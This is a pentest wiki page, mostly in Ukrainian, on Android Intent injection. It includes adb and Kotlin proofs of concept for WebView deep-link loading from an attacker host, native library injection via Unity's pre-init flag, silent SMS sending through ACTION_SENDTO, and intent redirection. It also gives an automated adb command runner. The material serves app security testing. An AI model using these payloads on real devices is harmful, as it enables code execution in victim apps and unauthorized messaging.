# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection зловживає компонентами, які приймають Intents під контролем зловмисника або даними, що потім перетворюються на Intents. Два дуже поширені патерни під час Android app pentests:

- Передача спеціально сформованих extras до exported Activities/Services/BroadcastReceivers, які потім перенаправляються до привілейованих, non-exported компонентів.
- Активація exported VIEW/BROWSABLE deep links, які пересилають URL під контролем зловмисника у internal WebViews або інші чутливі sinks.

## Deep links → WebView sink (URL parameter injection)

If an app exposes a custom scheme deep link such as:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
і приймаюча Activity пересилає параметр запиту `url` у WebView, ви можете примусити додаток відобразити довільний віддалений вміст у власному контексті WebView.

PoC через adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Наслідки
- HTML/JS виконується всередині профілю WebView додатку.
- Якщо JavaScript увімкнено (за замовчуванням або через неправильний порядок перевірок), ви можете перелічити/використовувати будь-які відкриті `@JavascriptInterface` об'єкти, вкрасти cookies/local storage WebView і pivot.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Помилка порядку перевірок: увімкнення JavaScript

Поширена помилка — вмикання JavaScript (або інших дозволяючих налаштувань WebView) до завершення остаточної перевірки/списку дозволених URL. Якщо ранні хелпери приймають ваш deep link і WebView конфігурується раніше, остаточне завантаження відбувається з уже увімкненим JavaScript, навіть якщо пізніші перевірки некоректні або запізнілі.

На що звертати увагу у декомпільованому коді:
- Кілька хелперів, які parse/split/rebuild the URL по‑різному (несумісна нормалізація).
- Виклики `getSettings().setJavaScriptEnabled(true)` перед останньою перевіркою allowlist для host/path.
- Типовий конвеєр: parse → partial validate → configure WebView → final verify → loadUrl.


## Unity Runtime: Intent-to-CLI extras → інжекція нативної бібліотеки до pre-init (RCE)

Unity‑based Android apps зазвичай використовують `com.unity3d.player.UnityPlayerActivity` (або `UnityPlayerGameActivity`) як entry Activity. Unity’s Android template трактує спеціальний Intent extra з назвою `unity` як рядок command-line прапорів для Unity runtime. Якщо entry Activity експортується (за замовчуванням у багатьох шаблонах), будь‑який локальний додаток — а іноді й вебсайт, якщо присутній `BROWSABLE` — може передати цей extra.

Небезпечний, недокументований прапорець призводить до виконання нативного коду на дуже ранній стадії ініціалізації процесу:

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)` дуже рано в init, завантажуючи керований атакуючим ELF всередині процесу цільового додатку з його UID та правами доступу.

Фрагмент реверс-інжинірингу (спрощено):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Чому це працює
- The Intent extra `unity` is parsed into Unity runtime flags.
- Supplying the pre-init flag points Unity at an attacker-controlled ELF path within an allowed linker namespace path (see constraints below).

Conditions for exploitation
- The Unity entry Activity is exported (commonly true by default).
- For one-click remote via browser: the entry Activity also declares `android.intent.category.BROWSABLE` so extras can be passed from an `intent:` URL.

Local exploitation (same device)
1) Place a payload ELF at a path readable by the victim app. Easiest: ship a malicious library in your own attacker app and ensure it is extracted under `/data/app/.../lib/<abi>/` by setting in the attacker’s manifest:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Запустіть Unity activity жертви з CLI pre-init flag у додатковому параметрі `unity`. Приклад ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity викликає `dlopen("/data/.../libpayload.so", RTLD_NOW)`; ваш payload виконується в процесі жертви, успадковуючи всі його дозволи додатку (camera/mic/network/storage, etc.) та доступ до сесій/даних всередині додатку.

Notes
- The exact `/data/app/...` path varies across devices/installs. An attacker app can retrieve its own native lib dir at runtime via `getApplicationInfo().nativeLibraryDir` and communicate it to the trigger.
- The file need not end with `.so` if it is a valid ELF – `dlopen()` cares about ELF headers, not extensions.

Remote one‑click via browser (conditional)
If the Unity entry activity is exported with `BROWSABLE`, a website can pass extras via an `intent:` URL:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Однак на сучасних Android простори імен динамічного linker'а та SELinux блокують завантаження з багатьох публічних шляхів (наприклад, `/sdcard/Download`). Ви побачите помилки на кшталт:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Стратегія обходу: націлюйтеся на додатки, які кешують байти, контрольовані атакуючим, у своєму приватному сховищі (наприклад, HTTP caches). Оскільки дозволені шляхи включають `/data` і приватний каталог додатка, вказування `-xrsdk-pre-init-library` на абсолютний шлях усередині кешу додатка може задовольнити обмеження лінкера і призвести до виконання коду. Це відтворює попередні cache-to-ELF RCE шаблони, помічені в інших Android apps.


## Confused‑Deputy: безшумне SMS/MMS через ACTION_SENDTO (Wear OS Google Messages)

Деякі стандартні додатки для обміну повідомленнями неправильно автоматично виконують неявні messaging intents, перетворюючи їх на примітив confused‑deputy: будь-який неповноважений додаток може викликати `Intent.ACTION_SENDTO` з `sms:`, `smsto:`, `mms:`, або `mmsto:` і спричинити миттєву відправку без підтверджувального UI і без дозволу `SEND_SMS`.

Key points
- Trigger: implicit `ACTION_SENDTO` + схема URI для повідомлень.
- Data: вкажіть отримувача в URI, текст повідомлення в екстра `"sms_body"`.
- Permissions: відсутні (немає `SEND_SMS`), покладається на обробника SMS/MMS за замовчуванням.
- Observed: Google Messages for Wear OS (patched May 2025). Інші обробники слід перевірити аналогічно.

Мінімальний payload (Kotlin)
```kotlin
val intent = Intent(Intent.ACTION_SENDTO).apply {
data = Uri.parse("smsto:+11234567890") // or sms:, mms:, mmsto:
putExtra("sms_body", "Hi from PoC")
// From a non-Activity context add NEW_TASK
addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(intent)
```
ADB PoC (без спеціальних дозволів)
```bash
# SMS/SMS-to
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890"   --es sms_body "hello"

# MMS/MMS-to (handler-dependent behaviour)
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890"   --es sms_body "hello"
```
Розширення поверхні атаки (Wear OS)
- Будь-який компонент, здатний запускати Activities, може відправити той самий payload: Activities, foreground Services (with `FLAG_ACTIVITY_NEW_TASK`), Tiles, Complications.
- Якщо default handler автоматично відправляє, зловживання може бути one‑tap або повністю silent з фонових контекстів залежно від політик OEM.

Pentest checklist
- Resolve `ACTION_SENDTO` на цілі, щоб ідентифікувати default handler; перевірте, чи показує він compose UI або silently sends.
- Exercise all four schemes (`sms:`, `smsto:`, `mms:`, `mmsto:`) та extras (`sms_body`, optionally `subject` for MMS) щоб перевірити відмінності в поведінці.
- Враховуйте charged destinations/premium‑rate numbers при тестуванні на реальних пристроях.


## Other classic Intent injection primitives

- startActivity/sendBroadcast, які використовують attacker-supplied `Intent` extras, що пізніше повторно розбираються (`Intent.parseUri(...)`) і виконуються.
- Exported proxy components, які пересилають Intents до non-exported sensitive components без перевірки дозволів.

---

## Automating exported-component testing (Smali-driven ADB generation)

Коли exported components очікують специфічні extras, здогади щодо форми payload призводять до марної витрати часу та false negatives. Можна автоматизувати виявлення ключів/типів безпосередньо зі Smali і згенерувати готові до запуску adb команди.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: декомпілювати та просканувати Smali на наявність викликів типу `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` щоб визначити, які extras та поля споживаються кожним компонентом.
- Output: для кожного exported Activity/Service/Receiver/Provider інструмент виводить коротке пояснення та точну команду `adb shell am ...`/`cmd content ...` з коректно типізованими прапорцями.

Install
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Використання
```bash
python apk-components-inspector.py target.apk
```
Приклад виводу
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras — шпаргалка (прапори, що залежать від типу)
- Рядки: `--es key value` | Масив рядків: `--esa key v1,v2`
- Цілі числа: `--ei key 123` | Масив цілих: `--eia key 1,2,3`
- Булеві: `--ez key true|false`
- Longs: `--el key 1234567890`
- Числа з плаваючою точкою: `--ef key 1.23`
- URI (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- extra компонента: `--ecn key com.pkg/.Cls`
- Null рядковий extra: `--esn key`
- Типові прапори: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Корисні поради для Providers
- Використовуйте `adb shell cmd content query|insert|update|delete ...`, щоб звертатися до ContentProviders без агентів.
- Для SQLi-проб варіюйте `--projection` і `--where` (aka selection), коли провайдер підкріплений SQLite.

Автоматизація full-pipeline (інтерактивний виконавець)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>Допоміжний скрипт для розбору та виконання команд adb</summary>
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
</details>

Запуск на пристрої: the inspector написаний на Python і працює в Termux або на rooted телефонах, де доступні `apktool`/`androguard`.

---

## Intent Redirection (CWE-926) – виявлення та експлуатація

Патерн
- Експортований entry point (Activity/Service/Receiver) читає вхідний Intent і пересилає його внутрішньо або зовнішньо без перевірки джерела/даних, наприклад:
- `startActivity(getIntent())`
- `startActivity(intent)` where `intent` came from an extra like `redirect_intent`/`next_intent`/`pending_intent` or `Intent.parseUri(...)`.
- Довіра полям `action`/`data`/`component` без перевірок; відсутня перевірка ідентичності викликача.

Що шукати в Smali/Java
- Використання `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Прямі виклики `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` на Intents, контрольовані attacker.
- Відсутність перевірок `getCallingPackage()`/`getCallingActivity()` або власних перевірок дозволів.

ADB PoC templates
- Proxy Activity, що пересилає додатковий Intent у привілейовану внутрішню Activity:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Експортований Service, який обробляє parcelable `redirect_intent`:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exported Receiver, який ретранслює без перевірки:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Flags, корисні для поведінки у стилі singleTask
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Приклади з реального світу (ступінь впливу варіюється):
- CVE-2024-26131 (Element Android): експортовані потоки, що призводять до маніпуляції WebView, PIN bypass, login hijack.
- CVE-2023-44121 (LG ThinQ Service): exported receiver action `com.lge.lms.things.notification.ACTION` → ефекти на рівні системи.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): перенаправлення → довільний доступ до файлів (з взаємодією користувача).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents leak content.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).


---

## References

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 — Intent Abuse in Google Messages for Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
- [PoC repo – io-no/CVE-2025-12080](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)
- [Android docs – Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)


{{#include ../../banners/hacktricks-training.md}}
